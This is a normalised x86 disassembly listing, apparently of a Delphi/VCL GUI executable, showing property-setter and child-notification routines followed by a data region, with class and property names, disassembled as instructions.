call sub_3aa2b48
mov ebp eax
test bp bp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov [ esp + 0x4 ] al
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
mov eax ebx
call sub_3ac1190
mov edx ebp
call sub_3ac1248
inc eax
je r-xdata
sub_3ac0964
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_3ac0984
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_3ac09a4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x1 ] al
movzx eax [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
movzx edx [ edi + 0x94 ]
mov eax edi
call sub_3ac0dfc
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_3ac0dfc
sub_3ac0b40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a83f88
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ac0b94
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_3a64380
mov eax [ esi + 0x9c ]
call sub_3a64380
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ac0428
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_3a6efbc
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ac0be4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7abb4
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_3ac0c94
movzx edx [ ebx + 0x69 ]
mov eax edi
call sub_3ac0cf4
movzx edx [ ebx + 0x6a ]
mov eax edi
call sub_3ac0dfc
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_3ac0f38
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_3ac0f98
movzx edx [ ebx + 0x84 ]
mov eax edi
call sub_3ac0ff4
movzx edx [ ebx + 0x86 ]
mov eax edi
call sub_3ac1058
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ac0c94
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_3a656c8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_3a652f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
sub_3ac0cf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_3ac0dec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_3ac078c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_3ac0778
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_3ac0cf4
sub_3ac0dfc
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx edx [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
movzx eax [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
sub_3ac0e78
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_3a656c8
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_3a652f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ac0ee0
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
sub_3ac0f38
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_3a656c8
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_3a652f4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
sub_3ac0f98
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
sub_3ac0ff4
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
movzx eax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
sub_3ac1058
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x86 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
movzx eax [ esp ]
mov [ ebx + 0x86 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
movzx edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_3a64530
test eax eax
je r-xdata
sub_3ac10b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_3a656c8
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_3a83bd4
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_3ac0c94
sub_3ac1104
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_3ac112c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3ac0594
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
movzx edx [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_3ac0cf4
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_3ac11b8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x90 ] eax
sub_3ac11ec
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3ac121c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7c51c
mov edi eax
mov eax esi
call sub_3aa2e54
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_3ac1248
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_3ac128c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3ac12b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac12b8
retn
sub_3ac15bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edi ] dl
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push ss
lodsb [ esi ]
add ecx [ esi ]
pop ss
lodsb [ esi ]
add esp [ edx + eax ]
add ah ch
mov bl 0xaa
add esi eax
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
add ebp [ edx + edx * 2 ]
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add esp esp
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
push edx
lodsb [ esi ]
add ebx [ eax - 0x13fc5478 ]
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
insb
push edx
lodsb [ esi ]
add edi [ edx + eax * 4 - 0x7737fc55 ]
stosd [ edi ]
add edx [ eax + ecx * 4 ]
stosd [ edi ]
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
sub_3ac16f4
mov edi 0xac5878ff
add ebp [ eax + 0x59 ]
lodsb [ esi ]
add ecx [ ecx + ebx * 2 + 0x5a3003ac ]
lodsb [ esi ]
add edx [ eax + 0x58 ]
lodsb [ esi ]
add esi [ eax + 0x1403ac53 ]
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax ] al
or [ esi ] 0x0
cmovg ebp [ esi + 0x41 ]
outsd
insb
nop
sub [ edi ] dl
lodsb [ esi ]
add eax [ edi ]
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
outsb
mov [ ebx ] dl
lodsb [ esi ]
add edx [ eax + 0x2 ]
add bh bh
sub [ ebp - 0x54 ] dl
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000f ] al
outsd
jb r-xdata
outsd
insb
add al 0x16
lodsb [ esi ]
add edx esp
mov bh 0xaa
add edx [ ecx ]
add [ 0x6d726f46 ] al
jae r-xdata
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add ebp [ eax ]
add al [ eax ]
[ eax ]
add [ edx + esi * 4 + 0x22803aa ] dh
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f1300
test al 0x3
in al dx
cmp ch [ eax - 0x57c51bfd ]
add edx [ eax ]
test al 0x3
rcr [ edx - 0x54 ] 0x3
mov esp 0xc803ab82
mov [ ebx - 0x5477ebfd ] ch
add ebp [ eax - 0x14 ]
stosb [ edi ]
add eax [ eax - 0x5ffc5483 ]
jge r-xdata
jae r-xdata
add al bl
sbb [ ebx + eax ] ebp
add [ eax ] al
add [ eax ] al
mov eax 0xc603ac19
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f13000d ] al
outsb
adc ebp [ ebx + eax - 0xfffdac ]
cmp [ ebp - 0x54 ] dl
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc edx
outsw
jb r-xdata
stosd [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
add ecx [ edx + edi * 2 ]
stosd [ edi ]
add ebp [ eax - 0x53fc5515 ]
jmp r-xdata
add eax 0xf8000000
sbb [ ebx + eax + 0x26c ] ebp
mov eax 0xf003ac15
cmp eax 0x45d403a8
cmpsb [ esi ] [ edi ]
add ebp [ edi + esi ]
test al 0x3
fadd [ ebp - 0x5a ]
inc eax
add ah dl
sbb [ ebx + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ecx ]
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x39fc53e7 ] bh
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
add eax [ ebx ]
or al 0x54
inc edx
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] 0x0
add [ eax + 0x560d0010 ] al
insb
imul esp [ edi + 0x6e ] 0x69736f50
je r-xdata
sbb al 0xb3
stosb [ edi ]
add esi [ eax ]
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f000e ] al
outsb
inc ecx
push edx
lodsb [ esi ]
add ebx [ eax - 0x13fc5478 ]
inc ecx
stosd [ edi ]
add edx eax
stosb [ edi ]
cmpsd [ esi ] [ edi ]
add esp [ ebx ]
stosd [ edi ]
add eax [ esp + edi ]
stosd [ edi ]
add ebp eax
push edx
outsd
jb r-xdata
sbb [ ebx + eax + 0x42540c03 ] ch
add esp esp
jb r-xdata
inc edx
popad
jb r-xdata
pop ss
lodsb [ esi ]
add eax [ ebx ]
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
add ebp [ edx + edx * 2 ]
inc ebp
cmpsb [ esi ] [ edi ]
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
pop ss
lodsb [ esi ]
add eax [ 0x6d726f46 ]
inc edx
outsd
jb r-xdata
sub al 0xab
add esi [ eax - 0x7 ]
stosb [ edi ]
add ecx [ eax ]
jb r-xdata
jb r-xdata
je r-xdata
cmpsb [ esi ] [ edi ]
xor al 0x43
jae r-xdata
lea eax [ eax ]
aam 0x18
lodsb [ esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
lodsb [ esi ]
add eax [ esi ]
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0xfffffffff8000000 ] al
sub_3ac1a67
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
xchg edx eax
add [ eax ] eax
call esp
mov ch [ ebx + 0x103 ]
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
add bh bh
jb r-xdata
add [ eax ] al
add [ eax ] bl
add [ ecx ] cl
inc edx
jbe r-xdata
insb
inc ebp
jae r-xdata
add [ eax ] cl
inc esp
outsd
lodsb [ esi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ esi + 0x64 ] r-xdata
cwde
add [ eax ] eax
jmp [ ebx + ecx * 4 ]
mov dl 0xaa
add edx [ ebp + 0x4ff0001 ]
mov ebp [ ebx + 0x103 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + 0x65 ] eax
jbe r-xdata
sbb eax [ eax ]
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
mov cl 0xaa
add edx [ ebx - 0x6f00ffff ]
mov ch [ ebx + 0x103 ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi ] dl
add [ edx ] cl
inc edx
jbe r-xdata
hlt
jb r-xdata
add [ eax + 0x430b001c ] al
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax + eax ]
add [ eax ] al
sbb [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add bh bh
jle r-xdata
je r-xdata
add ebx [ ebp ]
add bh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
jb r-xdata
jl r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
mov cl 0xaa
add edx [ ecx + eax - 0x756f0100 ]
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ds
add [ edx ] cl
inc esp
jb r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ds
insb
adc al 0xa0
stosb [ edi ]
add esi [ eax + eax ]
[ edi - 0x55 ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] al
add [ edi ] bl
imul ebp [ esi + 0x74 ] 0xa6100073
add ebx esp
add [ eax ] eax
jmp [ eax + 0x67 ]
add [ eax + 0x4208001a ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6065646f
sbb [ ebx + eax - 0xfffd98 ] ch
insb
dec edi
add [ eax ] al
and [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
mov eax 0x7003a873
add [ eax ] al
add [ eax ] eax
inc ebx
jne r-xdata
and [ edx ] 0x0
add eax 0x6f6c6f43
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax + eax ]
[ eax ]
jae r-xdata
adc [ esi + 0x1d903 ] ah
call [ esi + edi * 2 ]
stosd [ edi ]
add edi [ eax ]
jle r-xdata
jb r-xdata
add bh bh
sub ch bh
stosb [ edi ]
add esi [ ebp + edi * 8 - 0x56 ]
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050022 ] al
outsd
insb
outsd
jb r-xdata
outsd
add [ gs : eax ] dl
cmpsb [ esi ] [ edi ]
add edx [ eax ]
add dh bh
push 0x84fe0000
and ch [ ebx + 0x3 ]
add [ ecx ] 0x0
dec ebp
add eax [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050023 ] al
je r-xdata
arpl [ ebx + 0x53 ] bp
imul esi [ ebp - 0x4c ] 0x7e03aa96
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x6f440800
sahf
stosb [ edi ]
add ecx [ edi - 0x70010000 ]
add [ eax ] dl
cmpsb [ esi ] [ edi ]
add edx [ eax + edx * 4 ]
stosd [ edi ]
xor eax [ eax + esi * 2 + 0x78 ]
test al 0x3
push 0x7cff0000
cld
stosb [ edi ]
add ecx [ esp + edi * 8 + 0x3aa ]
add [ eax - 0x80000000 ] al
and al 0x0
add al 0x46
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al [ eax ]
or dl [ eax + 0x61 ]
outsb
je r-xdata
add ebx [ edx ]
add bh bh
jl r-xdata
mov [ 0x1a003aa ] al
add bh bh
adc al 0x91
stosd [ edi ]
add eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50070025 ] al
popad
imul ebp [ fs : esi + 0x67 ] r-xdata
pushad
add [ eax ] al
push [ eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
